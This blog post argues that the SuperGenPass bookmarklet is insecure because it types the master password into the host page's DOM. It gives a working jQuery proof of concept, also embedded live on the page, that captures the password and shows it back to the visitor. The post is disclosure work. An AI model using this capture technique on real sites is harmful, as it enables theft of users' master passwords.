---
title: SuperGenFail
tags:  []
layout: post
description: SuperGenPass considered harmful
comments: false
---

<style type="text/css">
form#supergenpass_test {
    height: auto;
    overflow: auto;
    padding-left: 20px;
    margin-bottom: 20px;
    }
    form#supergenpass_test div {
        clear: both;
        padding-bottom: 10px;
        }
    form#supergenpass_test label {
        width: 100px;
        float: left;
        font-size: 16px;
        line-height: 25px;
        }
    form#supergenpass_test input {
        width: 200px;
        padding: 2px;
        font-size: 16px;
        font-family: Helvetica, Arial, verdana;
        border: 1px solid #000;
        }
</style>

<script type="text/javascript">
(function($) {
    var eventName = 'masterPassword',
        genPassInput = '#gp2_pass_box input[type="password"]',
        genPassButton = '#gp2_pass_box input[type="button"]';
    $.event.special.masterPassword = {
        setup: function() {
            var elem = $(this),
                captureMasterPassword = function() {
                    elem.trigger(eventName, $(genPassInput).val());
                };
            $(genPassButton).live('click', captureMasterPassword);
            $(genPassInput).live('keydown', function(e) {
                if (e.keyCode === 13) { captureMasterPassword(e); }
            });
        }
    };
})(jQuery);

jQuery(function($){
    $(document).bind('masterPassword', function(e, data) {
        $('<div><em>Be safe, stop using SuperGenPass.  Your master password is: <strong>' + data +'</strong></em></div>')
            .hide()
            .appendTo($('#supergenpass_test'))
            .show(300);
    });        
});

</script>


[SuperGenPass](http://supergenpass.com/) is a popular password management tool.  The pitch:

> Instead of storing your passwords on your hard disk or online—where they are vulnerable to theft and data loss—SuperGenPass uses a hash algorithm to transform a master password into unique, complex passwords for the Web sites you visit. 

And this functionality is all bundled up in a bookmarklet.  Alice visits a host's login form, clicks her SuperGenPass bookmarklet, enters her master password, and her host's password field is instantly populated with a hash of the host's URL + her master password -- a long, unique, password that Alice never even has to know.  *Clever.*  Except,

### SuperGenPass is completely insecure.  

SuperGenPass presents a small master password form overlaid across the host's login page by injecting its form *into the DOM of the host page*.  So, when Alice is providing her master password, she's *crossing a trust boundary*.  The master password, which ideally is never transmitted to *any* party, becomes co-mingled with the host's untrusted data and scripts simply by being typed.  And of course, once the site has the master, it can be transmitted back to the host, or even other domains.  An XSS hole would allow an attacker to easily plant a master password collector.

### jQuery-based Attack

As of writing, SuperGenPass's [site](http://supergenpass.com/) neither identifies its creator nor provides a way to contact its maintainers, and its [mailing list](http://groups.google.com/group/supergenpass) has disappeared.  It seems reasonable to demonstrate just how easy it is to capture a master password.

Here's a quickie [jQuery](http://jquery.com/) plugin which uses the [Special Events API](http://benalman.com/news/2010/03/jquery-special-events/) to expose a new event named `masterPassword` which is raised after a user has entered a master password, passing along the password as event data.  It uses live event delegation to bind events raised on SuperGenPass form inputs which will be injected by the bookmarklet.

{% highlight javascript %}
(function($) {
    var eventName = 'masterPassword',
        genPassInput = '#gp2_pass_box input[type="password"]',
        genPassButton = '#gp2_pass_box input[type="button"]';
    $.event.special[eventName] = {
        setup: function() {
            var elem = $(this),
                captureMasterPassword = function() {
                    elem.trigger(eventName, $(genPassInput).val());
                };
            $(genPassButton).live('click', captureMasterPassword);
            $(genPassInput).live('keydown', function(e) {
                if (e.keyCode === 13) { captureMasterPassword(e); }
            });
        }
    };
})(jQuery);
{% endhighlight %}

A *friendly* site could use it for good:

{% highlight javascript %}
$(document).bind('masterPassword', function(e, data) {
    alert('Be safe, stop using SuperGenPass.  Your master password was ' + data);
});
{% endhighlight %}

So, let's try it out.  Grab the SuperGenPass [bookmarklet](http://supergenpass.com/), and then come back here and click it.  The mockup login form below will be automatically targeted.  

<form method="GET" action="/" id="supergenpass_test">
    <div>
        <label for="username">User Name</label><input type="text" name="username" />
    </div>
    <div>
        <label for="password">Password</label><input type="password" name="password" />
    </div>
</form>

### Wow, that's nuts. Who would use SuperGenPass?

Well, it's interesting.  SuperGenPass tends to be used and recommended exclusively within technical circles, by people who know the importance of strong passwords and have at least a vague notion of what hashing is.  I suspect the cleverness and technical elegance of the solution is precisely why it lives on, like a tickle in the mind.  

### Alternatives

Since the main vulnerability is a trust boundary violation, moving the password form out of the host's DOM could theoretically be enough.  Direct browser or OS integration could accomplish this, and [several](https://addons.mozilla.org/en-US/firefox/addon/52490/) [projects](http://github.com/gfxmonk/supergenpass) attempt to do just that, although I've never tried them.  And in the end, sometimes you can't beat the physical world for digital security.  

[Bruce Schneier](http://www.schneier.com/blog/archives/2005/06/write_down_your.html):

> Simply, people can no longer remember passwords good enough to reliably defend against dictionary attacks, and are much more secure if they choose a password too complicated to remember and then write it down. We're all good at securing small pieces of paper. I recommend that people write their passwords down on a small piece of paper, and keep it with their other valuable small pieces of paper: in their wallet.

Be careful out there.
